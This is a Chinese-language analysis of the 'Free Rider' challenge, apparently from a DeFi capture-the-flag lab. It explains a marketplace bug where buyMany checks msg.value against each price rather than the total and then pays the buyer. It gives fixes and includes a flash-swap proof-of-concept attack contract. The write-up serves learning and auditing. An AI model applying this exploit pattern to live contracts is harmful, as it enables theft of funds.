# Free Rider 漏洞分析

## 1. 合约功能概述

`FreeRiderNFTMarketplace` 是一个 NFT 交易市场，支持批量上架与批量购买。配套的 `FreeRiderRecoveryManager` 在收到 6 个指定 NFT 后会发放赏金。

**核心组件：**
- **FreeRiderNFTMarketplace.sol**: 市场合约，维护 NFT 报价并处理购买
- **FreeRiderRecoveryManager.sol**: 回收合约，收到 6 个 NFT 后发放 45 ETH 赏金
- **FreeRider.t.sol**: 关卡测试，玩家初始仅有 0.1 ETH，需拿走 6 个 NFT 并获利

**业务流程：**
1. 卖家上架 NFT，单价 15 ETH（共 6 个）
2. 买家调用 `buyMany` 批量购买
3. 回收管理合约收到 6 个 NFT 后把赏金发给指定地址

---

## 2. 漏洞位置

### 漏洞代码（FreeRiderNFTMarketplace.sol）

```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        _buyOne(tokenIds[i]);
    }
}

function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // 先转 NFT
    DamnValuableNFT _token = token;
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // ⚠️ 再用 ownerOf(tokenId) 决定收款人
    // 此时 owner 已经变成买家 msg.sender，导致钱发给买家自己
    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
}
```

### 漏洞本质

这里有两个业务逻辑错误叠加：

1. **批量支付校验错误**：`buyMany` 没有校验“总价”，而是每次 `_buyOne` 都用同一个 `msg.value` 比较。
2. **付款对象错误**：先转 NFT 后取 `ownerOf` 付款，导致“卖家回款”变成“买家自收款”。

结果是：攻击者可以用极小前置资金买下全部 NFT，且支付逻辑反向补贴买家。

---

## 3. 漏洞原理分析

### 3.1 批量购买的支付缺陷

`msg.value` 在一次外部调用中是固定值，`buyMany` 内循环不会递减它。于是：

```text
假设 msg.value = 15 ETH，单价 = 15 ETH
第1个 NFT: 15 >= 15 ✅
第2个 NFT: 15 >= 15 ✅
...
第6个 NFT: 15 >= 15 ✅
```

本应支付 90 ETH，却只需在入口传入 15 ETH。

### 3.2 付款对象被污染

`_buyOne` 的时序是：

1. `safeTransferFrom(seller -> buyer)`
2. `ownerOf(tokenId)` 读取当前 owner
3. 向 owner 付款

由于第 1 步后 owner 已是 buyer，市场把钱发给了买家自己，卖家未收到款项。

### 3.3 关卡利用闭环（资金来源）

玩家只有 0.1 ETH，不足以启动购买，需要瞬时流动性。测试环境有 Uniswap V2 池，可通过 flash swap 借出 WETH，
换成 ETH 完成购买、拿到 NFT、领取赏金，再归还闪电借款。

---

## 4. 修复方案

### 方案一：正确处理总价与逐项扣减（推荐）

```solidity
function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
    uint256 totalPrice;
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        uint256 price = offers[tokenIds[i]];
        if (price == 0) revert TokenNotOffered(tokenIds[i]);
        totalPrice += price;
    }
    if (msg.value < totalPrice) revert InsufficientPayment();

    for (uint256 i = 0; i < tokenIds.length; ++i) {
        _buyOneFixed(tokenIds[i]);
    }
}
```

### 方案二：先缓存卖家地址，再转 NFT、再付款

```solidity
address seller = _token.ownerOf(tokenId);   // ✅ 转移前缓存卖家
_token.safeTransferFrom(seller, msg.sender, tokenId);
payable(seller).sendValue(priceToPay);      // ✅ 明确付款给卖家
```

### 方案三：加回归测试覆盖批量场景

- 批量买 6 个时，断言必须支付总价 90 ETH
- 断言卖家余额增加、买家余额减少
- 断言市场余额变化与成交额一致

---

## 5. Proof of Concept（关键代码）

```solidity
function attack() external {
    // 1) 从 Uniswap V2 闪电借 15 WETH（足够触发 buyMany 的错误校验）
    pair.swap(15 ether, 0, address(this), bytes("flash"));

    // 2) 把剩余利润回传给玩家
    payable(beneficiary).transfer(address(this).balance);
}

function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
    // 3) WETH -> ETH，用于市场购买
    weth.withdraw(amount0);

    // 4) 仅用 15 ETH 调用 buyMany，一次拿下 6 个 NFT
    marketplace.buyMany{value: 15 ether}(tokenIds);

    // 5) 把 6 个 NFT 送入 recoveryManager，触发 45 ETH 赏金
    nft.safeTransferFrom(address(this), address(recoveryManager), tokenId, abi.encode(beneficiary));

    // 6) 归还闪电借款（含 fee）
    uint256 repayment = (amount0 * 1000) / 997 + 1;
    weth.deposit{value: repayment}();
    weth.transfer(address(pair), repayment);
}
```

---

## 6. 总结

`Free Rider` 是一个典型的 **业务逻辑漏洞** 案例，而不是复杂密码学或底层 EVM 漏洞：

- 批量函数未做总价校验
- 状态更新顺序错误导致付款对象错误

这类漏洞在真实项目中很常见，危害往往大于“单点代码 bug”。审计时应重点检查：

1. 批量操作中的总量约束
2. 状态变化前后读取的语义一致性
3. 资金流向是否与业务角色匹配
